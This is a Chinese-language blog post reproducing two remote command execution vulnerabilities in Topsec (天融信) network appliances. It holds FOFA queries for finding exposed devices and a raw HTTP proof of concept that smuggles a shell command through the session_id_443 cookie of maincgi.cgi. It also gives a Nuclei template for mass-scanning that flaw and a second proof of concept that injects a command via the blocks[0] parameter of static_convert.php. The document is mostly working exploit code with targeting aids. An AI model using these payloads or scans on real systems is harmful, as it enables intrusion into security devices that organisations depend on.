# 原创
：  漏洞复现--天融信TOPSEC两处远程命令执行

# 漏洞复现--天融信TOPSEC两处远程命令执行

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

天融信（TOPSEC）是国内领先的网络安全解决方案提供商之一。他们专注于网络安全技术和产品的研发、生产和服务，为政府机构、企业和个人用户提供全面的网络安全解决方案。

### 二：漏洞影响版本

天融信TOPSEC

### 三：网络空间测绘查询

fofa:<br/> `title="Web User Login" &amp;&amp; body="/cgi/maincgi.cgi?Url=VerifyCode"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d8316c513a6beecae022ece15ca17371.jpeg"/>

### 四：漏洞复现1

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/fda7ad301d609f32c604be98b1478021.jpeg"/><br/> POC1:

```
GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
Host: X.X.X.X
Cookie: session_id_443=1|echo 'vulnerability!' &gt; /www/htdocs/site/image/vul.txt;
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/64dd6da68b13fb993d89d93853dce8df.jpeg"/><br/> 访问/site/image/vul.txt<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1b413feb3127c0e214986ab522e691e7.jpeg"/>

### 五：批量检测

```
id: Trx-topsec-maincgi-cookie-rce

info:
  name: Trx-topsec-maincgi-cookie-rce
  author: 芝士土拨鼠
  severity: critical
  description: 天融信（TOPSEC）是国内领先的网络安全解决方案提供商之一。他们专注于网络安全技术和产品的研发、生产和服务，为政府机构、企业和个人用户提供全面的网络安全解决方案。
variables:
  file_name: "{{to_lower(rand_text_alpha(6))}}"
  file_content: "{{to_lower(rand_text_alpha(15))}}"
requests:
  - raw:
      - |+
        GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
        Host: {{Hostname}}
        Cookie: session_id_443=1|echo '{{file_content}}' &gt; /www/htdocs/site/image/{{file_name}}.txt;
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

      - |
        GET /site/image/{{file_name}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 &amp;&amp; status_code_2 == 200 &amp;&amp; contains(body_2, '{{file_content}}')"

```

### ：漏洞复现2

fofa：<br/> `app="天融信-上网行为管理系统"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/126580c78583a65cebf196a006826f4c.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4c1f9523d69cf30e90cd609b23c6f9a7.jpeg"/><br/> POC:

```
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'vulnerability!'%20&gt;&gt;%20/var/www/html/vul.txt%0A HTTP/1.1
Host: X.X.X.X
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8bef3f65e9cc2f0f8db5ea75e113aeb8.jpeg"/><br/> 访问vul.txt<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1355333421e3ee307ad4185527cf2f25.jpeg"/>
